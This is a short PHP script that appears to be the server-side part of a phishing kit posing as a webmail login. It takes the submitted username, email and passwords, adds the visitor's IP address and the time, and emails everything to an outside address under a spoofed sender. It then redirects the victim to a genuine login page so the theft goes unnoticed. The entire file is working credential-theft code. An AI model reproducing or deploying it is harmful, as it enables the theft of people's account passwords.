<? session_start();
$username = $_POST['username'];
$email = $_POST['email'];
$password1 = $_POST['password1'];
$password2 = $_POST['password2'];
$ip = $HTTP_SERVER_VARS['REMOTE_ADDR'];
$date = date("D M d, Y g:i a");
$subj = "[ $username | $email ]";
$msg = "Username: $username\nE-mail: $email\nPassword: $password1 / $password2\n\n[ IP:$ip  DATE:| $date ]";
$from = "From: web <no-reply@x83.mx91.9x8xy.org>";
mail("charlesdaniels247@zoho.com", $subj, $msg, $from);
header("Location: http://mail2web.com/login/"); ?>